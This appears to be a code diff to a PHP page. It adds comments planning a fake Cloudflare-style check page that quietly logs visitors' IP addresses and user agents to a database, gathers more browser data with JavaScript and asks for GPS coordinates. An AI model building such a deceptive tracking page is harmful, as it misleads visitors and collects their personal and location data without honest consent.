@@ -1,4 +1,11 @@
 <?php
+//front end page
+// designed to look like a Cloudflare check
+// when really its saved the users IP Address  and user agent via php code before its loaded.
+// and save that data into a db.
+// and once its loaded. it will update that database item with items pulled using js
+// will also try to request gps coordinates from user.
+
 
 // Include the Mobile_Detect.php file
 require_once $_SERVER['DOCUMENT_ROOT'].'/mobileDetect/src/MobileDetect.php';
